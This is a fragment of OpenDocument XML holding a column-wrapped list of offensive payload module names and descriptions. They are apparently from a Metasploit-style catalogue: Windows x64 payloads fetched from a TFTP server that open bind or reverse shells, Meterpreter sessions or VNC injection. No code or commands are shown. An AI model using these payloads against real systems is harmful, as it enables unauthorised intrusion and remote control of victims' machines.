      <text:p text:style-name="P1"><text:s text:c="4"/>erse_named_pipe <text:s text:c="17"/>d from a tftp server. Custom sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>the attacker via a named pipe p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/custom/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp <text:s text:c="24"/>d from a tftp server. Custom sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>the attacker (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/custom/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp_rc4 <text:s text:c="20"/>d from a tftp server. Custom sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/custom/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp_uuid <text:s text:c="19"/>d from a tftp server. Custom sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>the attacker with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>(Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/custom/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_winhttp <text:s text:c="20"/>d from a tftp server. Custom sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ellcode stage. Tunnel communica</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion over HTTP (Windows x64 win</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>http)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/custom/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_winhttps <text:s text:c="19"/>d from a tftp server. Custom sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ellcode stage. Tunnel communica</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion over HTTPS (Windows x64 wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/exec <text:s text:c="7"/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d from a tftp server. Execute a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n arbitrary command (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/loadlibrar <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>y <text:s text:c="31"/>d from a tftp server. Load an a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rbitrary x64 library path</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/messagebox <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d from a tftp server. Spawn a d</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ialog via MessageBox using a cu</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>stomizable title, text &amp; icon</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/bind_ipv6_tcp <text:s text:c="17"/>d from a tftp server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r an IPv6 connection (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/bind_ipv6_tcp_uuid <text:s text:c="12"/>d from a tftp server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r an IPv6 connection with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/bind_named_pipe <text:s text:c="15"/>d from a tftp server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a pipe connection (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/bind_tcp <text:s text:c="22"/>d from a tftp server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/bind_tcp_rc4 <text:s text:c="18"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/bind_tcp_uuid <text:s text:c="17"/>d from a tftp server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a connection with UUID Suppor</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/reverse_http <text:s text:c="18"/>d from a tftp server. Tunnel co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/reverse_https <text:s text:c="17"/>d from a tftp server. Tunnel co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/reverse_named_pipe <text:s text:c="12"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker via a named</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>pipe pivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/reverse_tcp <text:s text:c="19"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/reverse_tcp_rc4 <text:s text:c="15"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/reverse_tcp_uuid <text:s text:c="14"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker with UUID S</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>upport (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/reverse_winhttp <text:s text:c="15"/>d from a tftp server. Tunnel co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/reverse_winhttps <text:s text:c="14"/>d from a tftp server. Tunnel co</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>mmunication over HTTPS (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r_bind_named_pipe <text:s text:c="15"/>d from a tftp server. Connect t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o victim and spawn a Meterprete</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r shell. Requires Windows XP SP</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r_bind_tcp <text:s text:c="22"/>d from a tftp server. Connect t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o victim and spawn a Meterprete</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r shell. Requires Windows XP SP</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r_reverse_http <text:s text:c="18"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to attacker and spawn a Met</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>erpreter shell. Requires Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r_reverse_https <text:s text:c="17"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to attacker and spawn a Met</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>erpreter shell. Requires Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r_reverse_ipv6_tcp <text:s text:c="14"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to attacker and spawn a Met</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>erpreter shell. Requires Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/meterprete <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r_reverse_tcp <text:s text:c="19"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to attacker and spawn a Met</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>erpreter shell. Requires Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/peinject/b <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_ipv6_tcp <text:s text:c="20"/>d from a tftp server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r an IPv6 connection (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/peinject/b <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_ipv6_tcp_uuid <text:s text:c="15"/>d from a tftp server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r an IPv6 connection with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/peinject/b <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_named_pipe <text:s text:c="18"/>d from a tftp server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a pipe connection (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/peinject/b <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_tcp <text:s text:c="25"/>d from a tftp server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/peinject/b <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_tcp_rc4 <text:s text:c="21"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/peinject/b <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_tcp_uuid <text:s text:c="20"/>d from a tftp server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>r a connection with UUID Suppor</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/peinject/r <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_named_pipe <text:s text:c="15"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker via a named</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>pipe pivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/peinject/r <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp <text:s text:c="22"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/peinject/r <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp_rc4 <text:s text:c="18"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/peinject/r <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp_uuid <text:s text:c="17"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker with UUID S</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>upport (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/pingback_r <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp <text:s text:c="22"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to attacker and report UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>(Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/powershell <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_bind_tcp <text:s text:c="23"/>d from a tftp server</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/powershell <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_reverse_tcp <text:s text:c="20"/>d from a tftp server</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/powershell <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_reverse_tcp_ssl <text:s text:c="16"/>d from a tftp server</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/shell/bind <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_ipv6_tcp <text:s text:c="23"/>d from a tftp server. Spawn a p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>iped command shell (Windows x64</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>) (staged). Listen for an IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/shell/bind <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_ipv6_tcp_uuid <text:s text:c="18"/>d from a tftp server. Spawn a p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>iped command shell (Windows x64</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>) (staged). Listen for an IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>connection with UUID Support (W</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>indows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/shell/bind <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_named_pipe <text:s text:c="21"/>d from a tftp server. Spawn a p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>iped command shell (Windows x64</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>) (staged). Listen for a pipe c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/shell/bind <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28"/>d from a tftp server. Spawn a p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>iped command shell (Windows x64</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>) (staged). Listen for a connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/shell/bind <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp_rc4 <text:s text:c="24"/>d from a tftp server. Spawn a p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>iped command shell (Windows x64</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>) (staged). Connect back to the</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="38"/>attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/shell/bind <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp_uuid <text:s text:c="23"/>d from a tftp server. Spawn a p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>iped command shell (Windows x64</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>) (staged). Listen for a connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion with UUID Support (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/shell/reve <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rse_tcp <text:s text:c="25"/>d from a tftp server. Spawn a p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>iped command shell (Windows x64</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>) (staged). Connect back to the</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>attacker (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/shell/reve <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rse_tcp_rc4 <text:s text:c="21"/>d from a tftp server. Spawn a p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>iped command shell (Windows x64</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>) (staged). Connect back to the</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/shell/reve <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rse_tcp_uuid <text:s text:c="20"/>d from a tftp server. Spawn a p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>iped command shell (Windows x64</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>) (staged). Connect back to the</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>attacker with UUID Support (Wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ndows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/shell_bind <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28"/>d from a tftp server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a connection and spawn a comm</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>and shell (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/shell_reve <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rse_tcp <text:s text:c="25"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to attacker and spawn a com</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mand shell (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_ipv6_tcp <text:s text:c="19"/>d from a tftp server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r an IPv6 connection (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_ipv6_tcp_uuid <text:s text:c="14"/>d from a tftp server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r an IPv6 connection with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_named_pipe <text:s text:c="17"/>d from a tftp server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a pipe connection (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_tcp <text:s text:c="24"/>d from a tftp server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_tcp_rc4 <text:s text:c="20"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_tcp_uuid <text:s text:c="19"/>d from a tftp server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a connection with UUID Suppor</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>t (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_http <text:s text:c="20"/>d from a tftp server. Tunnel co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_https <text:s text:c="19"/>d from a tftp server. Tunnel co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp <text:s text:c="21"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp_rc4 <text:s text:c="17"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp_uuid <text:s text:c="16"/>d from a tftp server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker with UUID S</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>upport (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_winhttp <text:s text:c="17"/>d from a tftp server. Tunnel co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_winhttps <text:s text:c="16"/>d from a tftp server. Tunnel co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmunication over HTTPS (Windows</text:p>
